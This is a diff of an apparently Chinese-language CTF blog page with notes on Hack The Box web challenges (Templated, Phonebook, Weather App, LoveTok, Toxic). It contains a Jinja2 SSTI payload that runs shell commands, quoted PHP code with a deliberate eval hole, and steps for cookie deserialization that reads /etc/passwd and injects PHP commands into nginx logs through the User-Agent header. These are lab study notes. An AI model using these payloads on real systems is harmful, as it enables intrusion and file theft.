@@ -15,7 +15,7 @@
 <meta property="og:description" content="Challenges-&gt;active challenges Templated非常简单的Flask&#x2F;jinja2模板注入 1234&amp;#123;% for c in &amp;#x27;&amp;#x27;.__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__&#x3D;&#x3D;&amp;#x27;catch_warnings&amp;#x27; %&amp;#125;&amp;#">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-07-28T08:38:23.000Z">
-<meta property="article:modified_time" content="2023-07-31T10:30:46.269Z">
+<meta property="article:modified_time" content="2023-08-02T12:15:05.718Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -91,7 +91,8 @@
         <p>Challenges-&gt;active challenges</p>
 <h2 id="Templated"><a href="#Templated" class="headerlink" title="Templated"></a>Templated</h2><p>非常简单的Flask/jinja2模板注入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-<p>啥过滤也没有，唯一难点估计是一眼看过去不知道注入点在哪，F12啥也没有<br>没写出来，没啥头绪<br>··············分割线·······················<br>进入靶机注意到这是个登录界面，尝试单双引号测试，显示登录失败，注意到url后?message提供错误信息，可以在url中修改改变红框内的报错信息，但没啥用。下面有个蓝色框的贴士<br>输入“\”页面无法连接，输入“*”进入搜索界面，输入1得到用户信息，然后卡了<br>··············分割线·······················<br>writeup:<a target="_blank" rel="noopener" href="https://blog.csdn.net/galaxy3000/article/details/122975302?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169052768016800184190415%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169052768016800184190415&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-122975302-null-null.142%5Ev91%5Ekoosearch_v1,239%5Ev3%5Einsert_chatgpt&amp;utm_term=hackthebox%20phonebook&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/galaxy3000/article/details/122975302?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169052768016800184190415%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169052768016800184190415&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-122975302-null-null.142^v91^koosearch_v1,239^v3^insert_chatgpt&amp;utm_term=hackthebox%20phonebook&amp;spm=1018.2226.3001.4187</a></p>
+<p>啥过滤也没有，唯一难点估计是一眼看过去不知道注入点在哪，F12啥也没有</p>
+<h2 id="Phonebook"><a href="#Phonebook" class="headerlink" title="Phonebook"></a>Phonebook</h2><p>没写出来，没啥头绪<br>··············分割线·······················<br>进入靶机注意到这是个登录界面，尝试单双引号测试，显示登录失败，注意到url后?message提供错误信息，可以在url中修改改变红框内的报错信息，但没啥用。下面有个蓝色框的贴士<br>输入“\”页面无法连接，输入“*”进入搜索界面，输入1得到用户信息，然后卡了<br>··············分割线·······················<br>writeup:<a target="_blank" rel="noopener" href="https://blog.csdn.net/galaxy3000/article/details/122975302?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169052768016800184190415%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169052768016800184190415&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-122975302-null-null.142%5Ev91%5Ekoosearch_v1,239%5Ev3%5Einsert_chatgpt&amp;utm_term=hackthebox%20phonebook&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/galaxy3000/article/details/122975302?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169052768016800184190415%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169052768016800184190415&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-122975302-null-null.142^v91^koosearch_v1,239^v3^insert_chatgpt&amp;utm_term=hackthebox%20phonebook&amp;spm=1018.2226.3001.4187</a></p>
 <p>查看wp发现是模糊测试<br>这是啥？<br>通过向目标系统提供非预期的输入并监视异常结果来发现软件漏洞，用随机坏数据（也称做 fuzz）攻击一个程序，然后等着观察哪里遭到了破坏。模糊测试的技巧在于，将尽可能多的杂乱数据投入程序中。</p>
 <p>解题需要找出管理员密码，而登陆前的贴士告诉了管理员是谁，查找得管理员username为reese<br>接下来需要写脚本暴力破解，时间较久，但网络不太行出不来</p>
 <h2 id="Weather-APP"><a href="#Weather-APP" class="headerlink" title="Weather APP"></a>Weather APP</h2><p>服务端请求伪造加SQL密码更新<br>··············分割线·······················<br>index.js可以看到：</p>
@@ -107,6 +108,11 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class TimeModel</span><br><span class="line">&#123;</span><br><span class="line">    public function __construct($format)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;format = addslashes($format);</span><br><span class="line"></span><br><span class="line">        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];</span><br><span class="line">        $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getTime()</span><br><span class="line">    &#123;</span><br><span class="line">        eval(&#x27;$time = date(&quot;&#x27; . $this-&gt;format . &#x27;&quot;, strtotime(&quot;&#x27; . $this-&gt;prediction . &#x27;&quot;));&#x27;);</span><br><span class="line">        return isset($time) ? $time : &#x27;Something went terribly wrong&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>对输入（format）只有简单的过滤就把它放出来了<br>··············分割线·······················<br>wp:<a target="_blank" rel="noopener" href="https://shakuganz.com/2021/06/23/hackthebox-lovetok-write-up/">https://shakuganz.com/2021/06/23/hackthebox-lovetok-write-up/</a></p>
 <h2 id="一点反思"><a href="#一点反思" class="headerlink" title="一点反思"></a>一点反思</h2><p>Weather App和LoveTok的题目都有不少文件，大部分没啥用，能在这些东西中找到能用的漏洞才能有突破口<br>LoveTok中接受了$_SERVER变量，但好像没啥用，可以算一个干扰吧<br>耐心看完题目逻辑才能知道大概干啥，以及多看看，不然都不知道题目想干啥</p>
+<h2 id="Toxic"><a href="#Toxic" class="headerlink" title="Toxic"></a>Toxic</h2><p>下载源码，一眼php反序列化，但写之后其实算命令注入+文件包含<br>··············分割线·······················<br>index.php:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">spl_autoload_register(function ($name)&#123;</span><br><span class="line">    if (preg_match(&#x27;/Model$/&#x27;, $name))</span><br><span class="line">    &#123;</span><br><span class="line">        $name = &quot;models/$&#123;name&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    include_once &quot;$&#123;name&#125;.php&quot;;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">if (empty($_COOKIE[&#x27;PHPSESSID&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $page = new PageModel;</span><br><span class="line">    $page-&gt;file = &#x27;/www/index.html&#x27;;</span><br><span class="line"></span><br><span class="line">    setcookie(</span><br><span class="line">        &#x27;PHPSESSID&#x27;, </span><br><span class="line">        base64_encode(serialize($page)), </span><br><span class="line">        time()+60*60*24, </span><br><span class="line">        &#x27;/&#x27;</span><br><span class="line">    );</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$cookie = base64_decode($_COOKIE[&#x27;PHPSESSID&#x27;]);</span><br><span class="line">unserialize($cookie);</span><br></pre></td></tr></table></figure>
+<p>PageModel.php:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PageModel</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line"></span><br><span class="line">    public function __destruct() </span><br><span class="line">    &#123;</span><br><span class="line">        include($this-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由源码可知，在页面刷新会发送Cookie，内容会将要打开的文件序列化后再base64加密，无过滤<br>1.对Cookie解码，修改读取文件为“/etc/passwd”<br>2.发现用户nginx，修改读取文件“/var/log/nginx/access.log”读取日志文件<br>3.发现日志文件用户记录请求头信息（User-Agent），修改为<code>&lt;?php system(&#39;ls /&#39;); ?&gt;</code>注入命令<br>4.发现flag文件，再次修改请求头注入读取flag的命令即可<br>··············分割线·······················<br>wp:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40952713/article/details/119795157">https://blog.csdn.net/qq_40952713/article/details/119795157</a></p>
 
       
     </div>
@@ -156,7 +162,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li></ul>
     </div>
   </div>
 
@@ -169,23 +175,23 @@
       <ul>
         
           <li>
+            <a href="/2023/08/10/xssnote/">2023/08/10：xss笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/10/uploadnote/">2023/08/10：upload笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/10/sstinote/">2023/08/10：ssti笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/03/upload-lab/">2023/08/03：upload-lab记录</a>
+          </li>
+        
+          <li>
             <a href="/2023/07/28/sstilab/">2023/7/28：sstilab记录</a>
-          </li>
-        
-          <li>
-            <a href="/2023/07/28/ImaginaryCTF2023/">2023/7/28：ImaginaryCTF2023记录</a>
-          </li>
-        
-          <li>
-            <a href="/2023/07/28/haxonbox/">2023/7/28：hack the box记录</a>
-          </li>
-        
-          <li>
-            <a href="/2023/07/21/xsslab/">2023/7/21：夏令营week2记录:xsslab</a>
-          </li>
-        
-          <li>
-            <a href="/2023/07/16/week1plus/">2023/07/15：夏令营week1记录:出题</a>
           </li>
         
       </ul>
